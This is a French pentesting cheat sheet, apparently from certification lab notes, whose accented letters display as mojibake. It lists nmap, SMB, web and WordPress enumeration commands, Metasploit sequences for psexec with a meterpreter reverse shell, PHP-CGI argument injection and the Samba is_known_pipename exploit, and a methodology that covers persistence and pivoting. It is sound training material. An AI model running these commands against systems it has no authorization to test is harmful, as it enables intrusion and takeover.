# üéØ Pentesting Black Box

[‚Üê Retour √† la table des mati√®res](../README.md)

## Windows Black Box

### Scan initial et √©num√©ration
```bash
# Scan Nmap complet pour Windows
nmap -T4 -PA -sC -sV -p- targetIP -oX nmap

# √ânum√©ration SMB d√©taill√©e
enum4linux -a targetIP
smbclient -L //targetIP
smbmap -H targetIP
```

### Attaques SMB avec credentials
```bash
# Une fois les credentials SMB obtenus
# Obtenir un shell avec PSExec (Impacket)
python3 /usr/share/doc/python3-impacket/examples/psexec.py Username@ip

# Alternative avec Metasploit
use exploit/windows/smb/psexec
set RHOSTS targetIP
set SMBUser username
set SMBPass password
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```

## Linux Black Box

### Scan et √©num√©ration PHP
```bash
# Recherche de vuln√©rabilit√©s PHP/CGI
nmap --script http-shellshock targetIP
nmap --script http-php-version targetIP

# Exploitation PHP CGI Argument Injection
use exploit/multi/http/php_cgi_arg_injection
set RHOSTS targetIP
set TARGETURI /cgi-bin/php
exploit
```

### √ânum√©ration des services locaux
```bash
# Une fois acc√®s obtenu, √©num√©rer les services
netstat -antp
netstat -tuln 127.0.0.1

# Rechercher des services sur localhost uniquement
ss -tlnp | grep 127.0.0.1
```

## Outils et Scripts Sp√©cialis√©s

### Nmap Scripts Utiles
```bash
# Script shellshock pour CGI
nmap --script http-shellshock --script-args uri=/cgi-bin/vulnerable.cgi targetIP

# √ânum√©ration WordPress
nmap --script http-wordpress-enum targetIP

# Utiliser la wordlist de plugins WordPress int√©gr√©e
cat /usr/share/nmap/nselib/data/wp-plugins.lst
```

### Nikto pour l'√©num√©ration web
```bash
# Scan Nikto d√©taill√© (utile si WPScan ne trouve rien)
nikto -h target.ine.local
nikto -h targetIP -C all

# Avec authentification si n√©cessaire
nikto -h targetIP -id username:password
```

### √ânum√©ration de r√©pertoires
```bash
# Si aucune vuln√©rabilit√© √©vidente, √©num√©rer tous les r√©pertoires
gobuster dir -u http://targetIP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Avec extensions communes
gobuster dir -u http://targetIP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js

# Fuzzing de fichiers
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://targetIP/FUZZ
```

## Exploitation Samba
```bash
# Exploit Samba is_known_pipename
use exploit/linux/samba/is_known_pipename
set RHOSTS targetIP
set RPORT 445
exploit
```

## Recherche d'Exploits

### Bases de donn√©es d'exploits
- [Exploit-DB](https://exploit-db.com/) - Base principale d'exploits
- [Rapid7](https://rapid7.com/) - Vuln√©rabilit√©s et exploits

### Recherche locale
```bash
# Searchsploit pour recherche locale
searchsploit service_name version
searchsploit -m exploit_id  # Copier l'exploit

# Mise √† jour de la base
searchsploit -u
```

## Techniques de Contournement

### Si WordPress sans vuln√©rabilit√©s √©videntes
```bash
# 1. WPScan standard
wpscan --url http://targetIP/wordpress --enumerate p,t,u

# 2. Si rien trouv√©, utiliser Nikto
nikto -h http://targetIP/wordpress

# 3. √ânum√©ration manuelle des r√©pertoires
gobuster dir -u http://targetIP/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### √ânum√©ration exhaustive
```bash
# Si aucune vuln √©vidente, √©num√©rer TOUT
# Ports, services, r√©pertoires, fichiers, param√®tres
nmap -p- -A targetIP
dirb http://targetIP /usr/share/wordlists/dirb/big.txt
```

## M√©thodologie Black Box

### Phase 1 : Reconnaissance
1. Scan de ports complet
2. Identification des services
3. √ânum√©ration des versions

### Phase 2 : √ânum√©ration
1. Services web (r√©pertoires, fichiers)
2. Services r√©seau (SMB, FTP, SSH)
3. Recherche de credentials par d√©faut

### Phase 3 : Exploitation
1. Recherche d'exploits publics
2. Test des vuln√©rabilit√©s communes
3. Exploitation des mauvaises configurations

### Phase 4 : Post-exploitation
1. √âl√©vation de privil√®ges
2. Persistance
3. Pivoting si r√©seau interne

## Conseils Pratiques

### Gestion du temps
- Commencer par les services les plus prometteurs
- Ne pas rester bloqu√© sur un service trop longtemps
- Toujours documenter les trouvailles

### Approche syst√©matique
- Suivre une checklist pour chaque service
- Tester les credentials par d√©faut
- V√©rifier les versions pour exploits connus

### Documentation
- Prendre des captures d'√©cran
- Noter tous les credentials trouv√©s
- Maintenir un journal des tentatives
